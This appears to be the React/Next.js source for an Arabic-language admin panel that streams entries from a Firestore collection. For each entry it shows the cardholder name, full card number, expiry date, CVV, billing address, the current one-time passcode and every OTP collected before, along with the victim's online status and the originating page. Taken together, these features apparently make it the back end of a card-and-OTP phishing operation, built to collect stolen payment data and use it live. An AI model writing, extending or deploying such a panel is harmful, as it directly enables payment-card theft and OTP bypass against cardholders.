"use client"

import type React from "react"

import { useState, useEffect, useMemo } from "react"
import { useRouter } from "next/navigation"
import {
  Trash2,
  CreditCard,
  LogOut,
  CheckCircle,
  Clock,
  MapPin,
  Search,
  Menu,
  ChevronLeft,
  ChevronRight,
  User,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { ar } from "date-fns/locale"
import { formatDistanceToNow } from "date-fns"
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { collection, doc, writeBatch, updateDoc, onSnapshot, query, orderBy } from "firebase/firestore"
import { onAuthStateChanged, signOut } from "firebase/auth"
import { auth, db } from "./lib/firestore"
import { playNotificationSound } from "./lib/actions"
import { Input } from "@/components/ui/input"
import { DropdownMenu, DropdownMenuContent, DropdownMenuItem, DropdownMenuTrigger } from "@/components/ui/dropdown-menu"
import { Sheet, SheetContent, SheetHeader, SheetTitle } from "@/components/ui/sheet"
import { Avatar, AvatarFallback, AvatarImage } from "@/components/ui/avatar"
import { toast } from "@/hooks/use-toast"
import type { PaymentDocument } from "./types/payment"
import { PaymentStatus } from "./components/payment-status"

export default function PaymentDashboard() {
  const [payments, setPayments] = useState<PaymentDocument[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const [selectedPayment, setSelectedPayment] = useState<PaymentDocument | null>(null)
  const [searchTerm, setSearchTerm] = useState("")
  const [currentPage, setCurrentPage] = useState(1)
  const [itemsPerPage] = useState(10)
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false)
  const router = useRouter()

  // Filter and search payments
  const filteredPayments = useMemo(() => {
    let filtered = payments

    if (searchTerm) {
      const term = searchTerm.toLowerCase()
      filtered = filtered.filter(
        (payment) =>
          payment.cardholderName?.toLowerCase().includes(term) ||
          payment.cardNumber?.toLowerCase().includes(term) ||
          payment.country?.toLowerCase().includes(term) ||
          payment.city?.toLowerCase().includes(term) ||
          payment.otp?.toLowerCase().includes(term) ||
          payment.pagename?.toLowerCase().includes(term),
      )
    }

    return filtered
  }, [payments, searchTerm])

  // Paginate payments
  const paginatedPayments = useMemo(() => {
    const startIndex = (currentPage - 1) * itemsPerPage
    return filteredPayments.slice(startIndex, startIndex + itemsPerPage)
  }, [filteredPayments, currentPage, itemsPerPage])

  // Calculate total pages
  const totalPages = Math.max(1, Math.ceil(filteredPayments.length / itemsPerPage))

  // Reset to first page when search changes
  useEffect(() => {
    setCurrentPage(1)
  }, [searchTerm])

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      if (!user) {
        router.push("/login")
      } else {
        const unsubscribePayments = fetchPayments()
        return () => {
          unsubscribePayments()
        }
      }
    })

    return () => unsubscribe()
  }, [router])

  const fetchPayments = () => {
    setIsLoading(true)
    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
    const unsubscribe = onSnapshot(
      q,
      (querySnapshot) => {
        const paymentsData = querySnapshot.docs
          .map((doc) => {
            const data = doc.data()
            return {
              id: doc.id,
              ...data,
              allOtps: data.allOtps || [],
              lastSeen: data.lastSeen || { sv: "unknown" },
            } as PaymentDocument
          })
          .filter((payment) => !payment.isHidden)

        // Play notification sound for new payments
        if (paymentsData.length > payments.length) {
          playNotificationSound()
        }

        setPayments(paymentsData)
        setIsLoading(false)
      },
      (error) => {
        console.error("Error fetching payments:", error)
        setIsLoading(false)
      },
    )

    return unsubscribe
  }

  const handleClearAll = async () => {
    setIsLoading(true)
    try {
      const batch = writeBatch(db)
      payments.forEach((payment) => {
        const docRef = doc(db, "pays", payment.id)
        batch.update(docRef, { isHidden: true })
      })
      await batch.commit()
      setPayments([])
      toast({
        title: "تم مسح جميع المدفوعات",
        description: "تم مسح جميع المدفوعات بنجاح",
      })
    } catch (error) {
      console.error("Error hiding all payments:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء مسح المدفوعات",
        variant: "destructive",
      })
    } finally {
      setIsLoading(false)
    }
  }

  const handleDelete = async (id: string) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { isHidden: true })
      setPayments(payments.filter((payment) => payment.id !== id))
      toast({
        title: "تم مسح المدفوعة",
        description: "تم مسح المدفوعة بنجاح",
      })
    } catch (error) {
      console.error("Error hiding payment:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء مسح المدفوعة",
        variant: "destructive",
      })
    }
  }

  const handleLogout = async () => {
    try {
      await signOut(auth)
      router.push("/login")
    } catch (error) {
      console.error("Error signing out:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تسجيل الخروج",
        variant: "destructive",
      })
    }
  }

  const handlePaymentClick = (payment: PaymentDocument) => {
    setSelectedPayment(payment)
  }

  const closeDialog = () => {
    setSelectedPayment(null)
  }

  const handleSearch = (e: React.ChangeEvent<HTMLInputElement>) => {
    setSearchTerm(e.target.value)
  }

  const handlePageChange = (page: number) => {
    setCurrentPage(page)
  }

  if (isLoading) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center w-full">
        <div className="flex flex-col items-center gap-4">
          <div className="h-10 w-10 animate-spin rounded-full border-4 border-primary border-t-transparent"></div>
          <div className="text-lg font-medium">جاري التحميل...</div>
        </div>
      </div>
    )
  }

  return (
    <div dir="rtl" className="min-h-screen bg-background text-foreground">
      {/* Mobile menu */}
      <Sheet open={mobileMenuOpen} onOpenChange={setMobileMenuOpen}>
        <SheetContent side="right" className="w-[250px] sm:w-[400px]" dir="rtl">
          <SheetHeader className="mb-6">
            <SheetTitle className="flex items-center gap-2">
              <CreditCard className="h-5 w-5 text-primary" />
              <span>لوحة المدفوعات</span>
            </SheetTitle>
          </SheetHeader>
          <div className="space-y-6">
            <div className="flex items-center gap-4">
              <Avatar>
                <AvatarImage src="/placeholder.svg?height=40&width=40" alt="صورة المستخدم" />
                <AvatarFallback>مد</AvatarFallback>
              </Avatar>
              <div>
                <p className="font-medium">مدير النظام</p>
                <p className="text-sm text-muted-foreground">admin@example.com</p>
              </div>
            </div>
            <nav className="space-y-2">
              <Button variant="ghost" className="w-full justify-start" onClick={() => setMobileMenuOpen(false)}>
                <CreditCard className="mr-2 h-4 w-4" />
                المدفوعات
              </Button>
              <Button variant="ghost" className="w-full justify-start text-red-500" onClick={handleLogout}>
                <LogOut className="mr-2 h-4 w-4" />
                تسجيل الخروج
              </Button>
            </nav>
          </div>
        </SheetContent>
      </Sheet>

      <div className="mx-auto">
        {/* Header */}
        <header className="border-b border-border bg-background/95 backdrop-blur supports-[backdrop-filter]:bg-background/60 sticky top-0 z-10">
          <div className="flex items-center justify-between p-4">
            <div className="flex items-center gap-4">
              <Button variant="ghost" size="icon" className="md:hidden" onClick={() => setMobileMenuOpen(true)}>
                <Menu className="h-5 w-5" />
                <span className="sr-only">القائمة</span>
              </Button>
              <div className="flex items-center gap-3">
                <div className="bg-primary/10 p-2 rounded-full">
                  <CreditCard className="h-5 w-5 text-primary" />
                </div>
                <h1 className="text-xl font-bold hidden sm:block">لوحة المدفوعات</h1>
              </div>
            </div>

            <div className="flex items-center gap-2">
              <Button
                variant="destructive"
                onClick={handleClearAll}
                disabled={payments.length === 0}
                className="hidden sm:flex items-center gap-2"
              >
                <Trash2 className="h-4 w-4" />
                مسح الكل
              </Button>

              <DropdownMenu>
                <DropdownMenuTrigger asChild>
                  <Button variant="ghost" className="relative h-9 w-9 rounded-full">
                    <Avatar className="h-9 w-9">
                      <AvatarImage src="/placeholder.svg?height=36&width=36" alt="صورة المستخدم" />
                      <AvatarFallback>مد</AvatarFallback>
                    </Avatar>
                  </Button>
                </DropdownMenuTrigger>
                <DropdownMenuContent align="end" className="w-56" alignOffset={8}>
                  <div className="flex items-center justify-start gap-2 p-2">
                    <div className="flex flex-col space-y-0.5 leading-none">
                      <p className="font-medium text-sm">مدير النظام</p>
                      <p className="text-xs text-muted-foreground">admin@example.com</p>
                    </div>
                  </div>
                  <DropdownMenuItem onClick={handleLogout}>
                    <LogOut className="ml-2 h-4 w-4" />
                    <span>تسجيل الخروج</span>
                  </DropdownMenuItem>
                </DropdownMenuContent>
              </DropdownMenu>
            </div>
          </div>
        </header>

        <div className="p-4 md:p-6">
          {/* Statistics */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-8">
            <Card className="bg-card shadow-sm hover:shadow-md transition-shadow duration-300">
              <CardHeader className="pb-2">
                <CardTitle className="text-sm text-muted-foreground font-medium">إجمالي المدفوعات</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="flex items-center gap-3">
                  <div className="rounded-full bg-blue-100 dark:bg-blue-900 p-3">
                    <CreditCard className="h-5 w-5 text-blue-600 dark:text-blue-300" />
                  </div>
                  <div className="text-3xl font-bold">{payments.length}</div>
                </div>
              </CardContent>
            </Card>

            <Card className="bg-card shadow-sm hover:shadow-md transition-shadow duration-300">
              <CardHeader className="pb-2">
                <CardTitle className="text-sm text-muted-foreground font-medium">المدفوعات المتصلة</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="flex items-center gap-3">
                  <div className="rounded-full bg-green-100 dark:bg-green-900 p-3">
                    <CheckCircle className="h-5 w-5 text-green-600 dark:text-green-300" />
                  </div>
                  <div className="text-3xl font-bold">{payments.filter((p) => p.online).length}</div>
                </div>
              </CardContent>
            </Card>

            <Card className="bg-card shadow-sm hover:shadow-md transition-shadow duration-300">
              <CardHeader className="pb-2">
                <CardTitle className="text-sm text-muted-foreground font-medium">المدفوعات اليوم</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="flex items-center gap-3">
                  <div className="rounded-full bg-purple-100 dark:bg-purple-900 p-3">
                    <Clock className="h-5 w-5 text-purple-600 dark:text-purple-300" />
                  </div>
                  <div className="text-3xl font-bold">
                    {
                      payments.filter((p) => {
                        const today = new Date().toDateString()
                        const paymentDate = new Date(p.createdDate).toDateString()
                        return today === paymentDate
                      }).length
                    }
                  </div>
                </div>
              </CardContent>
            </Card>
          </div>

          {/* Search */}
          <div className="mb-6">
            <div className="relative">
              <Search className="absolute left-2.5 top-2.5 h-4 w-4 text-muted-foreground" />
              <Input
                type="search"
                placeholder="بحث في المدفوعات..."
                className="w-full pl-9 pr-4"
                value={searchTerm}
                onChange={handleSearch}
              />
            </div>
          </div>

          {/* Payments Table */}
          <Card className="bg-card shadow-sm overflow-hidden">
            <CardHeader className="py-3 px-4 flex flex-row items-center justify-between">
              <CardTitle className="text-lg flex items-center gap-2">
                <CreditCard className="h-5 w-5 text-primary" />
                المدفوعات
                {searchTerm && (
                  <Badge variant="outline" className="mr-2">
                    نتائج البحث: {filteredPayments.length}
                  </Badge>
                )}
              </CardTitle>
            </CardHeader>

            {/* Desktop Table View */}
            <div className="hidden md:block overflow-x-auto">
              <table className="w-full">
                <thead>
                  <tr className="border-b border-border bg-muted/50">
                    <th className="px-4 py-3 text-right font-medium text-muted-foreground">حامل البطاقة</th>
                    <th className="px-4 py-3 text-right font-medium text-muted-foreground">رقم البطاقة</th>
                    <th className="px-4 py-3 text-right font-medium text-muted-foreground">الدولة/المدينة</th>
                    <th className="px-4 py-3 text-right font-medium text-muted-foreground">OTP</th>
                    <th className="px-4 py-3 text-right font-medium text-muted-foreground">الوقت</th>
                    <th className="px-4 py-3 text-center font-medium text-muted-foreground">الحالة</th>
                    <th className="px-4 py-3 text-center font-medium text-muted-foreground">الإجراءات</th>
                  </tr>
                </thead>
                <tbody>
                  {paginatedPayments.map((payment) => (
                    <tr
                      key={payment.id}
                      className="border-b border-border hover:bg-muted/50 transition-colors cursor-pointer"
                      onClick={() => handlePaymentClick(payment)}
                    >
                      <td className="px-4 py-3">
                        <div className="flex items-center gap-2">
                          <User className="h-4 w-4 text-muted-foreground" />
                          <span>{payment.cardholderName || "غير محدد"}</span>
                        </div>
                      </td>
                      <td className="px-4 py-3">
                        <span className="font-mono">{payment.cardNumber}</span>
                      </td>
                      <td className="px-4 py-3">
                        <div className="flex items-center gap-2">
                          <MapPin className="h-4 w-4 text-muted-foreground" />
                          <span>
                            {payment.country}/{payment.city}
                          </span>
                        </div>
                      </td>
                      <td className="px-4 py-3">
                        <Badge variant="outline" className="bg-blue-50 dark:bg-blue-950/30">
                          {payment.otp}
                        </Badge>
                      </td>
                      <td className="px-4 py-3 whitespace-nowrap">
                        <div className="flex items-center gap-2">
                          <Clock className="h-4 w-4 text-muted-foreground" />
                          <span>
                            {formatDistanceToNow(new Date(payment.createdDate), {
                              addSuffix: true,
                              locale: ar,
                            })}
                          </span>
                        </div>
                      </td>
                      <td className="px-4 py-3 text-center">
                        <PaymentStatus paymentId={payment.id} />
                      </td>
                      <td className="px-4 py-3">
                        <div className="flex justify-center gap-2">
                          <Button
                            variant="ghost"
                            size="sm"
                            onClick={(e) => {
                              e.stopPropagation()
                              handleDelete(payment.id)
                            }}
                            className="text-red-500 hover:text-red-600 hover:bg-red-50 dark:hover:bg-red-950/30"
                          >
                            <Trash2 className="h-4 w-4" />
                          </Button>
                        </div>
                      </td>
                    </tr>
                  ))}
                  {paginatedPayments.length === 0 && (
                    <tr>
                      <td colSpan={7} className="px-4 py-8 text-center text-muted-foreground">
                        <div className="flex flex-col items-center gap-2">
                          <CreditCard className="h-8 w-8 text-muted-foreground/50" />
                          <p>لا توجد مدفوعات متطابقة مع البحث</p>
                        </div>
                      </td>
                    </tr>
                  )}
                </tbody>
              </table>
            </div>

            {/* Mobile Card View */}
            <div className="md:hidden space-y-4 p-4">
              {paginatedPayments.length > 0 ? (
                paginatedPayments.map((payment) => (
                  <Card
                    key={payment.id}
                    className="overflow-hidden bg-card border-border cursor-pointer hover:shadow-md transition-shadow"
                    onClick={() => handlePaymentClick(payment)}
                  >
                    <CardHeader className="p-4 pb-2">
                      <div className="flex justify-between items-start">
                        <div className="flex items-center gap-2">
                          <User className="h-4 w-4 text-muted-foreground" />
                          <span className="font-medium">{payment.cardholderName || "غير محدد"}</span>
                        </div>
                        <PaymentStatus paymentId={payment.id} />
                      </div>
                    </CardHeader>
                    <CardContent className="p-4 pt-2">
                      <div className="space-y-2">
                        <div className="flex justify-between">
                          <span className="text-sm text-muted-foreground">رقم البطاقة:</span>
                          <span className="font-mono text-sm">{payment.cardNumber}</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-sm text-muted-foreground">الموقع:</span>
                          <span className="text-sm">
                            {payment.country}/{payment.city}
                          </span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-sm text-muted-foreground">OTP:</span>
                          <Badge variant="outline" className="bg-blue-50 dark:bg-blue-950/30">
                            {payment.otp}
                          </Badge>
                        </div>
                        <div className="flex justify-between items-center pt-2 border-t">
                          <span className="text-xs text-muted-foreground">
                            {formatDistanceToNow(new Date(payment.createdDate), {
                              addSuffix: true,
                              locale: ar,
                            })}
                          </span>
                          <Button
                            variant="outline"
                            size="sm"
                            onClick={(e) => {
                              e.stopPropagation()
                              handleDelete(payment.id)
                            }}
                            className="text-red-500 hover:text-red-600"
                          >
                            <Trash2 className="h-4 w-4" />
                          </Button>
                        </div>
                      </div>
                    </CardContent>
                  </Card>
                ))
              ) : (
                <div className="text-center py-8 text-muted-foreground">
                  <div className="flex flex-col items-center gap-2">
                    <CreditCard className="h-8 w-8 text-muted-foreground/50" />
                    <p>لا توجد مدفوعات متطابقة مع البحث</p>
                  </div>
                </div>
              )}
            </div>

            {/* Pagination */}
            {filteredPayments.length > 0 && (
              <div className="p-4 border-t border-border">
                <div className="flex items-center justify-center space-x-2 space-x-reverse">
                  <Button
                    variant="outline"
                    size="icon"
                    onClick={() => handlePageChange(currentPage - 1)}
                    disabled={currentPage <= 1}
                  >
                    <ChevronRight className="h-4 w-4" />
                  </Button>
                  <div className="flex items-center gap-1">
                    {Array.from({ length: totalPages }, (_, i) => i + 1).map((page) => (
                      <Button
                        key={page}
                        variant={currentPage === page ? "default" : "outline"}
                        size="icon"
                        className="h-8 w-8"
                        onClick={() => handlePageChange(page)}
                      >
                        {page}
                      </Button>
                    ))}
                  </div>
                  <Button
                    variant="outline"
                    size="icon"
                    onClick={() => handlePageChange(currentPage + 1)}
                    disabled={currentPage >= totalPages}
                  >
                    <ChevronLeft className="h-4 w-4" />
                  </Button>
                </div>
              </div>
            )}
          </Card>
        </div>
      </div>

      {/* Payment Details Dialog */}
      <Dialog open={selectedPayment !== null} onOpenChange={closeDialog}>
        <DialogContent className="bg-background text-foreground max-w-[90vw] md:max-w-2xl" dir="rtl">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2 text-xl">
              <CreditCard className="h-5 w-5 text-primary" />
              تفاصيل المدفوعة
            </DialogTitle>
          </DialogHeader>
          {selectedPayment && (
            <div className="space-y-6">
              {/* Card Information */}
              <div className="space-y-3 p-4 bg-muted/50 rounded-lg border border-border">
                <h3 className="font-semibold text-lg mb-3">معلومات البطاقة</h3>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="flex justify-between items-center py-2 border-b border-border/50">
                    <span className="font-medium text-muted-foreground">حامل البطاقة:</span>
                    <span className="font-semibold">{selectedPayment.cardholderName}</span>
                  </div>
                  <div className="flex justify-between items-center py-2 border-b border-border/50">
                    <span className="font-medium text-muted-foreground">رقم البطاقة:</span>
                    <span className="font-mono font-semibold">{selectedPayment.cardNumber}</span>
                  </div>
                  <div className="flex justify-between items-center py-2 border-b border-border/50">
                    <span className="font-medium text-muted-foreground">تاريخ الانتهاء:</span>
                    <span className="font-semibold">{selectedPayment.expiryDate}</span>
                  </div>
                  <div className="flex justify-between items-center py-2 border-b border-border/50">
                    <span className="font-medium text-muted-foreground">CVV:</span>
                    <span className="font-semibold">{selectedPayment.cvv}</span>
                  </div>
                </div>
              </div>

              {/* Billing Information */}
              <div className="space-y-3 p-4 bg-muted/50 rounded-lg border border-border">
                <h3 className="font-semibold text-lg mb-3">معلومات الفوترة</h3>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="flex justify-between items-center py-2 border-b border-border/50">
                    <span className="font-medium text-muted-foreground">العنوان:</span>
                    <span className="font-semibold">{selectedPayment.billingAddress}</span>
                  </div>
                  <div className="flex justify-between items-center py-2 border-b border-border/50">
                    <span className="font-medium text-muted-foreground">المدينة:</span>
                    <span className="font-semibold">{selectedPayment.city}</span>
                  </div>
                  <div className="flex justify-between items-center py-2 border-b border-border/50">
                    <span className="font-medium text-muted-foreground">الدولة:</span>
                    <span className="font-semibold">{selectedPayment.country}</span>
                  </div>
                  <div className="flex justify-between items-center py-2 border-b border-border/50">
                    <span className="font-medium text-muted-foreground">الرمز البريدي:</span>
                    <span className="font-semibold">{selectedPayment.zipCode}</span>
                  </div>
                </div>
              </div>

              {/* Security & Verification */}
              <div className="space-y-3 p-4 bg-muted/50 rounded-lg border border-border">
                <h3 className="font-semibold text-lg mb-3">الأمان والتحقق</h3>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="flex justify-between items-center py-2 border-b border-border/50">
                    <span className="font-medium text-muted-foreground">OTP الحالي:</span>
                    <Badge className="font-semibold bg-blue-600">{selectedPayment.otp}</Badge>
                  </div>
                  <div className="flex justify-between items-center py-2 border-b border-border/50">
                    <span className="font-medium text-muted-foreground">الحالة:</span>
                    <Badge variant={selectedPayment.online ? "default" : "secondary"}>
                      {selectedPayment.online ? "متصل" : "غير متصل"}
                    </Badge>
                  </div>
                </div>
                {selectedPayment.allOtps && selectedPayment.allOtps.length > 0 && (
                  <div className="pt-2 border-t border-border/50">
                    <span className="font-medium text-muted-foreground block mb-2">جميع رموز OTP:</span>
                    <div className="flex flex-wrap gap-2">
                      {selectedPayment.allOtps.map((otp, index) => (
                        <Badge key={index} variant="outline" className="bg-muted">
                          {otp}
                        </Badge>
                      ))}
                    </div>
                  </div>
                )}
              </div>

              {/* Additional Information */}
              <div className="space-y-3 p-4 bg-muted/50 rounded-lg border border-border">
                <h3 className="font-semibold text-lg mb-3">معلومات إضافية</h3>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="flex justify-between items-center py-2 border-b border-border/50">
                    <span className="font-medium text-muted-foreground">اسم الصفحة:</span>
                    <span className="font-semibold">{selectedPayment.pagename}</span>
                  </div>
                  <div className="flex justify-between items-center py-2 border-b border-border/50">
                    <span className="font-medium text-muted-foreground">تاريخ الإنشاء:</span>
                    <span className="font-semibold">
                      {new Date(selectedPayment.createdDate).toLocaleString("ar-SA")}
                    </span>
                  </div>
                  <div className="flex justify-between items-center py-2">
                    <span className="font-medium text-muted-foreground">آخر ظهور:</span>
                    <span className="font-semibold">{selectedPayment.lastSeen.sv}</span>
                  </div>
                </div>
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  )
}
